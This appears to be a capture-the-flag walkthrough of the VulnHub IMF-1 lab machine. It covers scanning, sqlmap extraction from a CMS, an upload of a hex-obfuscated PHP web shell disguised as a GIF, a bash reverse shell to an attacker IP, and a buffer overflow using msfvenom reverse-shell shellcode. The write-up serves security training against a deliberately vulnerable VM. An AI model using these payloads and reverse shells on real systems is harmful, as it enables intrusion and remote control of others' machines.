---
layout: post
title: IMF1-Machine
date: 06-11-2024 12:00:00 +0000
image: 
    path: /assets/covers/vulnhub.png
categories: [Pentesting]
tags: [Vulnhub, Nmap, Python, sqlmap, Ghidra, Metasploit, Buffer  Overflow, SQLI, Reverse Engineering]

---
# IMF1-Machine 
## Difficulty: Beginner - Moderate
#### Link to  the machine: https://www.vulnhub.com/entry/imf-1,162/

#### Table of Contents
-   [Introduction](#introduction)

-   [Prerequisites](#prerequisites)

-   [Summary](#Summary)

-   [Reconnaissance](#reconnaissance)

-   [Enumeration](#enumeration)

-   [Vulnerabilities](#vulnerabilities)

-   [Exploitation](#exploitation)

-   [Post-exploitation](#post-exploitation)
-   [Conclusion](#conclusion)

## Introduction
The IMF 1 machine on VulnHub is a CTF (Capture The Flag) challenge that involves multiple stages of enumeration, exploitation, and privilege escalation. In this environment, players must find multiple flags to progress towards gaining superuser (root) access.

The objective is to hack a fictional organization called IMF (Impossible Mission Force), and the tests involve vulnerabilities such as SQL injections and malicious file uploads.
## Prerequisites

- VulnHub .ova file of IMF1-Machine

- Kali linux or any other Linux distribution for Pentesting

- Knowledge of Nmap, Python, sqlmap, Ghidra, Metasploit, Buffer Overflow, SQL (you can learn here i explain it to you)

## Summary 
The "IMF1-Machine" on VulnHub presents a multifaceted challenge suitable for beginners to moderately experienced penetration testers. This machine simulates a corporate environment of the fictional Impossible Mission Force (IMF), offering various vulnerabilities such as SQL Injection (SQLi), buffer overflows, and opportunities for reverse engineering. Through systematic reconnaissance, enumeration, and exploitation, we were able to uncover multiple flags, ultimately achieving root access. This summary encapsulates the key phases and findings of our penetration testing journey.

**Key Phases**

1. **Reconnaissance**: Identified the target machine's IP address and open ports using tools like `arp-scan` and `nmap`.
2. **Enumeration**: Leveraged `WhatWeb`, `Gobuster`, and `sqlmap` to uncover web technologies, hidden directories, and SQL vulnerabilities.
3. **Vulnerabilities Exploitation**: Exploited SQL Injection to extract sensitive data and performed buffer overflow attacks to gain shell access.
4. **Post-exploitation**: Cracked hashed passwords using `John the Ripper`, escalated privileges via buffer overflow, and retrieved all available flags.
## Extracted Flags

| Flag Number | Encoded Flag                    | Decoded Flag            |
| ----------- | ------------------------------- | ----------------------- |
| Flag2       | flag2{aW1mYWRtaW5pc3RyYXRvcg==} | flag2{imfadministrator} |
| Flag3       | flag3{Y29udGludWVUT2Ntcw==}     | flag3{continuousTocs}   |
| Flag4       | flag4{dXBsb2Fkcjk0Mi5waHA=}     | flag4{uploadr942.php}   |
| Flag5       | flag5{YWdlbnRzZXJ2aWNlcw==}     | flag5{agentservices}    |
| Flag6       | flag6{R2gwc3RQcm90MGMwbHM=}     | flag6{Gh0sProt0c0ls}    |

## Reconnaissance

![](/assets/post/IMF/recon.png)

```bash
   sudo arp-scan -I eth0 --localnet --ignoredups
   ```
The command `sudo arp-scan -I eth0 --localnet --ignoredups` is used to scan devices on the local network through the `eth0` interface. Let's break it down:

- **sudo**: Executes the command with superuser privileges, necessary for network access.

- **arp-scan**: A tool for network scanning using the ARP (Address Resolution Protocol).

- **-I eth0**: Specifies the network interface to be used for the scan, in this case, `eth0`.

- **--localnet**: Scans all hosts on the local network.

- **--ignoredups**: Ignores duplicate responses from devices during the scan.

This command allows you to discover all devices connected to your local network, including their IP and MAC addresses.

We will focus on the VMware machine's IP **192.168.1.112**.

We attempt to ping it to determine the type of machine, whether it's Linux or Windows.
![](/assets/post/IMF/ping.png)

It appears to have a firewall, so we proceed with the scan:


![](/assets/post/IMF/nmap1.png)


```bash
   nmap -p- --open -sS --min-rate 5000 vvv -n -Pn <victims ip> -oG allports
   ```


The commands `flags`

- `nmap`: The command-line tool for network scanning.

- `-p-`: Scans all TCP ports from 1 to 65535.

- `--open`: Displays only the ports that are open.

- `-sS`: Performs a SYN stealth scan. This is a fast and discreet scan that sends SYN packets and waits for SYN-ACK responses to identify open ports.

- `--min-rate 5000`: Ensures `nmap` scans at least 5000 ports per second, increasing the scan speed.

- `-vvv`: Enables very verbose mode, providing detailed information during the scan.

- `-n`: Does not resolve hostnames, which speeds up the scan by skipping DNS resolution.

- `-Pn`: Skips the host discovery phase, assuming all hosts are active.

- `192.168.1.112`: The IP address of the host to scan.

- `-oG allports`: Saves the results in `grepable` format in the `allports` file.

Port **80/tcp** is open on the `imf1` machine. This means it is running an HTTP service.


![](/assets/post/IMF/nmap2.png)


```bash
   nmap -sCV 80 <victims ip> -oN targeted
   ```

Description of the Flags:

- **-sC**: Runs detection scripts using Nmap’s default script set. This includes a variety of scripts for version detection, vulnerabilities, and other services.

- **80**: port 80  is the port number for the HTTP service.

- **-sV**: Detects the version of the service. This tries to determine the name and version of the service running on the target port.

- **-oN**: Saves the scan results in a normal (readable) format. In this case, the file is named `targeted`.

### Scan Results:

- **IP Address**: 192.168.1.112

- **Open Port**: 80/tcp

- **Service**: HTTP

- **Service Version**: Apache httpd 2.4.18 (Ubuntu)

- **HTTP Title**: IMF - Homepage

- **HTTP Server Header**: Apache/2.4.18 (Ubuntu)

- **MAC Address**: 00:0C:29:08:EE:B8 (VMware)


## Enumeration

 For the next step we will use whatweb to see what we are dealing with:

![](/assets/post/IMF/whatweb.png)

```bash
   whatweb http:/<victims ip>
   ```


### WhatWeb Scan Information:

**WhatWeb** is a tool used for identifying technologies and frameworks used by a website. It provides details about the web server, content management systems, programming languages, and other components that help in analyzing the target’s technology stack.

- **Scanned URL**: `http://192.168.1.112`
- **HTTP Status Code**: `200 OK` - The page loaded successfully.
- **Web Server**: `Apache 2.4.18` - Indicates the version of the Apache web server running.

- **Frameworks and Technologies**:
    - **Bootstrap** - A popular CSS framework for web design.
    - **HTML5** - The fifth version of the HTML standard.
    - **jQuery 1.10.2** - A JavaScript library for simplifying DOM manipulation.
    - **Modernizr [2.6.2.min](https://2.6.2.min/?form=MG0AV3)** - A JavaScript library for detecting HTML5 and CSS3 features in the user's browser.

We examine the discovered web page:


![](/assets/post/IMF/webpage.png)


We examine the source code and find some JavaScript files:

![](/assets/post/IMF/jsfiles.png)

We combine the entire text string from the JavaScript files:

```bash
   ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==
   ```

We decode it in base64, resulting in flag2:


![](/assets/post/IMF/flag2.png)


```bash
   flag2{aW1mYWRtaW5pc3RyYXRvcg==}
   ```


Apparently, we can decode the flag's content as well.



![](/assets/post/IMF/decodeflag2.png)


Giving us a hint about a new directory on the web page:

![](/assets/post/IMF/imfad.png)

We open Burpsuite and intercept the request to the new directory:


![](/assets/post/IMF/burp.png)



This trick was to instruct the server to treat the password field as an array rather than a single value. This is a common technique sometimes used to see how the backend of an application responds. Depending on how the server is configured, several things could happen:

1. **The server may ignore the change**: If the backend isn’t set up to handle arrays in that field, it might simply ignore the brackets and treat it as a single value, interpreting the password as if you had sent `pass=test` instead of `pass[]=test`.

2. **The server might throw an error**: If the server expects a single value and you send an array, it could produce an error (for example, a validation or type error in the backend code). This might provide useful information on how the server handles unexpected input.

3. **The server might behave unexpectedly**: If the server is designed to handle arrays, it might accept the password field as a list of values and process it differently. For example, it might only check the first element of the array or execute some unexpected logic.

4. **Potential vulnerabilities**: In some poorly configured applications, sending an array in a field that doesn’t expect it can cause undesired behavior, such as value overwrites, data overflows, or, in more extreme cases, security vulnerabilities (like injections or unsafe deserialization).


![](/assets/post/IMF/pass.png)


We managed to access the login with flag3:
 ```bash
   flag3{Y29udGludWVUT2Ntcw==}
   ```
This type of format suggests it is a base64-encoded string.
   
![](/assets/post/IMF/deflag3.png)


We access the provided link:

![](/assets/post/IMF/cms.png)


## Vulnerabilities

![](/assets/post/IMF/sqlmap1.png)


```bash
sqlmap -u "http://192.168.1.112/imfadministrator/cms.php?pagename=home" --cookie="PHPSESSID=vamiotoji1f0253kmscf173ag7" --dbs
```
## SQLMap
**SQLMap** is an automated tool used to detect and exploit SQL injection vulnerabilities in database systems. It helps testers and security professionals to identify and manipulate SQL vulnerabilities in web applications by automating the process of injecting SQL commands.

SQLMap can be used to retrieve various types of information from databases, such as:
- Listing databases
- Extracting tables and columns
- Retrieving data within those tables
- Enumerating users, roles, and privileges
- And even accessing the underlying file system or running commands on the database server, depending on the level of access

In the image, the command used with SQLMap is:

- **-u**: Specifies the target URL where the SQL injection vulnerability might exist.
--cookie: Sends an authenticated session by including the PHP session ID (PHPSESSID), allowing SQLMap to interact with the application as an authenticated user.


- **--dbs**: Instructs SQLMap to enumerate and list all available databases on the target.


We found the following available table:

![](/assets/post/IMF/resqlm.png)


To list the tables within a specific database:


![](/assets/post/IMF/sqltable.png)


```bash
sqlmap -u "http://192.168.1.112/imfadministrator/cms.php?pagename=home" --cookie="PHPSESSID=vamiotoji1f0253kmscf173ag7" -D admin --tables
```

In this SQLMap command, several flags are used to specify the target database and retrieve a list of tables:


- **-D admin**: Specifies the database name (`admin`) to focus on. This flag directs SQLMap to target the specific database rather than listing all available databases.


- **--tables**: Instructs SQLMap to enumerate and list all tables within the specified database (`admin`).

This command is used to retrieve the names of all tables in the `admin` database, which can then be further explored for data extraction or additional information gathering.


With a table named `pages` available in the database admin:


![](/assets/post/IMF/pages.png)


The next step is to list the **columns** of the `pages` table and then extract the data it contains.


![](/assets/post/IMF/pages.png)

**List the columns of the `pages` table:**

To list the columns of the `pages` table, you can run the following command:

![](/assets/post/IMF/columns.png)

```bash
sqlmap -u "http://192.168.1.112/imfadministrator/cms.php?pagename=home" --cookie="PHPSESSID=vamiotoji1f0253kmscf173ag7" -D admin -T pages --columns 
```

In this SQLMap command, several flags are used to specify the target and retrieve a list of columns from a specific table:


- **-D admin**: Specifies the database name (`admin`) to target. This flag instructs SQLMap to focus on this particular database.

- **-T pages**: Specifies the table name (`pages`) within the `admin` database. SQLMap will perform operations on this table.

- **--columns**: Instructs SQLMap to enumerate and list all columns within the specified table (`pages`).

This command is used to retrieve the names and types of all columns in the `pages` table, allowing further exploration of the data structure and potential data extraction from this table.



We obtain the information of the `pages` table with 3 columns:

![](/assets/post/IMF/rscolumn.png)


To extract the data from the `pages` table:

![](/assets/post/IMF/dump.png)


Command:
```bash
sqlmap -u "http://192.168.1.112/imfadministrator/cms.php?pagename=home" --cookie="PHPSESSID=vamiotoji1f0253kmscf173ag7" -D admin -T pages --dump

```

The **--dump** flag in SQLMap is used to extract and display all data from the specified table in the target database. When combined with other flags, such as `-D` for the database and `-T` for the table, it allows SQLMap to retrieve the entire contents of that table.


We obtain the following information:


![](/assets/post/IMF/respag.png)


We obtained the following information from the `pages` table:

| id  | pagedata                                                                                                                        | pagename             |
| --- | ------------------------------------------------------------------------------------------------------------------------------- | -------------------- |
| 1   | Under Construction.                                                                                                             | upload               |
| 2   | Welcome to the IMF Administration.                                                                                              | home                 |
| 3   | Training classrooms available. Contact us for training.                                                                         | tutorials-incomplete |
| 4   | <h1>Disavowed List</h1> <ul><li>_********</li><li>****** ******</li><li>****_**</li><li>**** ********</li></ul><br />-Secretary | disavowlist          |


We gained access using the pagename `tutorials-incomplete`.


![](/assets/post/IMF/trpa.png)


We scanned the QR code and obtained the fourth flag:

![](/assets/post/IMF/qrsl.png)

``` bash
flag4{dXBsb2Fkcjk0Mi5waHA=}
```

We decoded the code in base64.

![](/assets/post/IMF/deflag4.png)


We use the result **uploadr942.php** as a hint to find the next page

We found a file upload field:

![](/assets/post/IMF/up.png)
## Exploitation
### Burpsuite upload


For the file upload, we will use Burp Suite and send the file upload request to the repeater:

![](/assets/post/IMF/burp2.png)


Screenshot of **Burp Suite** in **Repeater** mode, which is used to manually send HTTP requests and analyze responses.

**Left Side (Request) Burpsuite:**

1. **HTTP Method**:
   - A **POST** request is being sent to the URL `http://192.168.1.112/imfadministrator/upload942.php`.

2. **HTTP Headers**:
   - **Host**: `192.168.1.112` (the server the request is sent to).
   - **Content-Length**: 337 (the size of the request body).
   - **User-Agent**: Information about the client’s browser and operating system, here shown as `Mozilla/5.0 (Windows NT 10.0; Win64; x64)`.
   - **Referer**: `http://192.168.1.112/imfadministrator/upload942.php` (the page from which the request was made).
   - **Cookie**: `PHPSESSID=vamiotoji1f0253kmscf173ag7`, a valid PHP session cookie indicating the user is authenticated.

3. **Request Body**:
   - **Multipart/form-data**: A file is being uploaded as part of the request.
   - **File**: Attempting to upload a file named `cmd.gif`, but the file content appears to be PHP code:
     ```php
     <?php "\x73\x79\x73\x74\x65\x6d"($_GET['cmd']); ?>
     ```
     This PHP code, represented in hexadecimal, converts `"\x73\x79\x73\x74\x65\x6d"` into the `system()` function. This script will execute any command sent through the `$_GET['cmd']` variable.
   - **Content-Type of the File**: The file is marked as `image/jpg`, which is misleading because, while the file extension is `.gif`, the content is actually PHP code.

4. **Additional `submit` Field**:
   - The form includes a "Upload" button, indicating an attempt to upload a file.

**Right Side (Response) Burpsuite:**

1. **HTTP Response Headers**:
   - **Server**: Apache/2.4.18 (Ubuntu), the web server handling the request.
   - **Response Status**: 200 OK, indicating that the server accepted and processed the request successfully.
   - **Content-Length**: 449 (size of the response content).
   - **Connection**: Keep-Alive, keeping the connection open.
   - **Content-Type**: text/html; charset=UTF-8, indicating the response is an HTML page.

2. **Response Body**:
   - The HTML response shows a success message: `File successfully uploaded.`
   - The response also contains the file upload form, allowing the user to select and upload other files.

**Interpretation:**

The uploaded file has a `.gif` extension but contains **malicious PHP code**. This PHP code is designed to execute system commands sent via the URL (using the `cmd` parameter). If the server is vulnerable and executes the uploaded PHP file, it could allow arbitrary command execution on the system.

**Next Possible Step:**

Once the `cmd.gif` file (which is actually PHP) has been uploaded to the server, you could attempt to access it via a URL and add the `cmd` parameter to execute commands.

For example:

`http://192.168.1.112/imfadministrator/uploads/cmd.gif?cmd=whoami`

![](/assets/post/IMF/ls.png)

A **Web Shell** (malicious PHP file) has been accessed, allowing commands to be executed on the remote web server. This shell was uploaded to the vulnerable server, and the command executed is a **file listing (`ls -la`)** in the directory where the malicious file was uploaded.

**Key Details:**

1. **Web Shell URL**:
   - The URL of the malicious file is `http://192.168.1.112/imfadministrator/uploads/5a24cebeeb82.gif`. The file has a `.gif` extension but contains PHP code that executes operating system commands.
   - The executed command is `ls -la`, as shown in the URL: `?cmd=ls%20-la`. This lists the files and permissions in the current directory.

2. **Output of the `ls -la` Command**:
   - The command output provides a detailed listing of files in the `/uploads/` directory. The details include file permissions, file owner, file size, and modification dates.


We accessed flag number 5:

![](/assets/post/IMF/flag5.png)

``` bash
 flag5{YWdlbnRzZXJ2aWNlcw==}
```

We decoded it.

![](/assets/post/IMF/deflag5.png)


To access the victim machine, we will do the following process:


![](/assets/post/IMF/vcm.png)


### Top Left (Browser):

- **URL**: `http://192.168.1.112/imfadministrator/uploads/5a24cebeeb82.gif?cmd=bash...`
    - The file `5a24cebeeb82.gif` is used to execute a command through the `cmd` parameter in the URL.
    - The command being executed is a **reverse shell** using `bash`, which redirects input and output to IP address `192.168.1.153` on port `443`. The complete command is:

        ```bash
        bash -c "bash -i >& /dev/tcp/192.168.1.153/443 0>&1"
        ```

    - This redirects terminal output (stdin and stdout) to the TCP connection on port 443 of IP address `192.168.1.153`.

### Bottom Left (Terminal - Kali Linux):

1. **Netcat (nc) - First Failed Connection**:
    - The command `nc -nlvp 443` is set to **listen on port 443** of the attacker’s machine (Kali Linux) to receive the reverse connection.
    - **First Connection**: The first connection attempt came from `127.0.0.1`, which indicates it was likely a local test or an error. The output shown is unreadable as the shell was not properly established.

2. **Netcat (nc) - Second Successful Connection**:
    - The command `nc -nlvp 443` is executed again, this time receiving a connection from **192.168.1.112** (the vulnerable server).
    - The message `bash: cannot set terminal process group (1268)` indicates that the shell environment lacks job control, which is typical for limited shells.
    - **Executing Commands**: After the connection, the attacker executes the `ls` command to list files in the `/var/www/html/imfadministrator/uploads` directory. The output shows the following files:
        - `3e1ed582b191.jpg`
        - `5a24cebeeb82.gif` (the file used for the reverse connection)
        - **`flag5_abc123def.txt`**, which likely contains important information.



![](/assets/post/IMF/agent.png)

3. **Search for a file named `agent`**:

    ```bash
    www-data@imf:/$ find / -name agent 2>/dev/null
    ```

    Here, the `find` command is used to search for a file or directory named **`agent`** throughout the entire system (`/`). Standard error is redirected to `/dev/null` to suppress permission error messages.

    - The search reveals two locations:
        - `/usr/local/bin/agent`
        - `/etc/xinetd.d/agent`

4. **Inspecting the `agent` file in `/usr/local/bin/`**:

    ```bash
    www-data@imf:/$ file /usr/local/bin/agent
    ```

    The `file` command is used to determine the type of the file. In this case, it shows that **`agent`** is a 32-bit ELF executable file



    Upon connecting to port **7788**, the system requests an **agent ID** to authenticate the connection.


![](/assets/post/IMF/agent2.png)


**Analyzing the `agent` Binary Using Ghidra and Downloading It via Port 443**
  To accomplish this, we will analyze the binary using **Ghidra**. We utilize port **443** to download the `agent` to our machine and use it with Ghidra.
```bash
    www-data@imf:/$ wget https://<IP_ADDRESS>:443/agent -O agent
```
   
![](/assets/post/IMF/ghidra1.png)

**Analyzing the C Code**:

Within the C code, we see that the input only receives 9 characters or bytes.

![](/assets/post/IMF/c.png)


**Convert the Code to Decimal to Obtain the AgentID**:

We managed to enter with the code `48093572`.

![](/assets/post/IMF/c2.png)


We make the code a bit more readable


![](/assets/post/IMF/c4.png)


**Code Analysis:**

**1. **Local Variables**:**

- `pcVar1`: A character pointer that will store the return value of the `fgets` function, indicating whether the read was successful.
- `iVar2`: An integer that will store results from some operations like `getchar()` and will be used as a return value.
- `local_45 [56]`: A 56-byte buffer that will store the string inputted by the user (the extraction location).
- `local_d`: A character that will be used to process user input, specifically to handle the newline character.

**Potential Issues**

1. **Buffer Overflow**:
    
    - Although the size of the `local_45` buffer is 56 bytes, a maximum of 54 characters are being read with `fgets`, leaving space for the null terminator (`\0`). This is good for preventing buffer overflows, but it's always a good idea to be cautious when handling user inputs.
2. **Improvement in Error Handling**:
    
    - If `fgets` fails, it currently returns `-1`, but the user is not informed of this error. It would be helpful to add a message indicating that an error occurred during the read.
3. **Additional Characters After Input**:
    
    - The loop following the input read (`getchar()`) is used to clear any additional characters remaining in the input buffer (such as a newline). This can be useful to ensure that there is no unexpected data in the buffer when the program continues.

In this case, the `local_45` buffer is used to store the location entered by the user. If the program reads more data than `local_45` can hold, data will be written outside the buffer's boundaries, which could corrupt other local variables or even allow an attacker to take control of the program's flow.

Although the code uses `fgets` to read user input, which limits the number of characters read to 55 (`fgets(local_45, 55, stdin);`), there are other cases where an unsafe function like `gets()` (which does not control buffer size) could be used to cause an overflow.

We analyze the C code related to the menu and update the functions to make them more readable.


![](/assets/post/IMF/c5.png)

**`gets(local_a8);`**:Here lies an important issue. **`gets()`** is an unsafe function because it does not check how many characters are being read, allowing the user to input more data than the `local_a8` buffer can hold. This can lead to a **buffer overflow**, which could compromise the security of the program by overwriting adjacent memory, including important variables or function return addresses.

## Post-exploitation

**Using GDB to Exploit Buffer Overflow**:    We use **gdb** to exploit the buffer overflow.


![](/assets/post/IMF/gdb.png)


We verify if the buffer overflow is valid:    

![](/assets/post/IMF/buffer.png)


We verify the registers:


![](/assets/post/IMF/r.png)

**Current State Analysis:**

1. **Overwritten EIP Register**:
    
    - The **EIP** (Instruction Pointer) register contains the address `0x41414141`, which, as previously seen, is the hexadecimal value corresponding to the letter "A". This means that you have successfully overwritten the return address with "AAAA".
    
2. **Overwritten EBP Register**:
    
    - The **EBP** (Base Pointer) register is also overwritten with `0x41414141`. The **EBP** is generally used to point to the beginning of the stack frame, which confirms that you have completely overflowed the stack and overwritten both the **EBP** and the **EIP**.
    
3. **Memory in ESP**:
    
    - The memory dump from the **ESP** register shows that the stack is completely filled with "AAAA" (`0x41414141`), confirming that important stack content has been overwritten.


    We reintroduce 200 characters into the report.

![](/assets/post/IMF/r2.png)

4. **`eip` Register Has an Unusual Value (`0xfffffb43`)**:

    - The `eip` register has an unusual value (`0xfffffb43`), indicating that the program execution attempted to jump to an invalid memory address, causing a **segmentation fault**.
    
    - The contents of the registers are consistent with a **stack overflow**, especially because the `esp` register is pointing to memory addresses that appear to have been corrupted due to the injected data.
    
    - The string you introduced (a sequence generated by a pattern technique) overwrote the return addresses on the stack.


The next step is to adjust a payload or shellcode pointing to **EIP**.

![](/assets/post/IMF/ms.png)

- **msfvenom**: The tool used to create payloads (exploits).
- **-p linux/x86/shell_reverse_tcp**: Specifies the type of payload, in this case, a reverse shell for a Linux x86 system using TCP.
- **LHOST=192.168.111.45**: The local IP address to which the reverse shell will connect.
- **LPORT=443**: The local port used for the reverse connection.
- **-b '\x00\x0a\x0d'**: Specifies the problematic characters to avoid in the payload (e.g., null byte, newline, carriage return).
- **-f c**: The output format, in this case, C code.


Terminal Output:

![](/assets/post/IMF/tm.png)

Copying the Shellcode to Create an Exploit in Python
![](/assets/post/IMF/p.png)


This code sends a **payload** with shellcode and connects to a service at the address `127.0.0.1` and port `7788`, attempting to exploit a vulnerability using an address obtained from `objdump` within the victim machine.
Filtering the Agent:

![](/assets/post/IMF/f.png)

```bash
objdump -d agent |grep -i "FF D0"
```

`objdump -d agent | grep -i "FF D0"`, is disassembling the binary file named **agent** and searching for the assembler instruction `FF D0`, which corresponds to the **`call *%eax`** instruction. This **x86** assembly instruction is an indirect call to the address stored in the **EAX** register, meaning the program will execute the code at the address pointed to by **EAX**.

Already inside the machine, we have access to the following flag and conclude with it:
`flag6{R2gwc3RQcm90MGMwbHM=}`


## Extracted Flags

| Flag Number | Encoded Flag                    | Decoded Flag            |
| ----------- | ------------------------------- | ----------------------- |
| Flag2       | flag2{aW1mYWRtaW5pc3RyYXRvcg==} | flag2{imfadministrator} |
| Flag3       | flag3{Y29udGludWVUT2Ntcw==}     | flag3{continuousTocs}   |
| Flag4       | flag4{dXBsb2Fkcjk0Mi5waHA=}     | flag4{uploadr942.php}   |
| Flag5       | flag5{YWdlbnRzZXJ2aWNlcw==}     | flag5{agentservices}    |
| Flag6       | flag6{R2gwc3RQcm90MGMwbHM=}     | flag6{Gh0sProt0c0ls}    |





## Conclusion
The penetration testing of the **IMF1-Machine** provided a comprehensive exploration of various common vulnerabilities and exploitation techniques within a controlled environment. Throughout this engagement, we systematically identified, exploited, and documented multiple security flaws, culminating in the successful retrieval of all flags and achieving root access.
1. **SQL Injection (SQLi)**:
   - **Impact**: Allowed unauthorized access to the database, enabling the extraction of sensitive information and manipulation of data.
   - **Exploitation**: Utilized `sqlmap` to automate the detection and exploitation of SQLi vulnerabilities, leading to the extraction of database tables and data.

2. **File Upload Vulnerability**:
   - **Impact**: Enabled the execution of arbitrary commands on the server through malicious file uploads, compromising the integrity of the system.
   - **Exploitation**: Leveraged **Burp Suite** to upload a disguised PHP file (`cmd.gif`), which facilitated the establishment of a reverse shell.

3. **Buffer Overflow**:
   - **Impact**: Allowed the execution of arbitrary shellcode, leading to remote code execution and privilege escalation.
   - **Exploitation**: Analyzed the vulnerable `agent` binary using **Ghidra**, crafted a malicious payload with `msfvenom`, and successfully exploited the buffer overflow to gain root access.
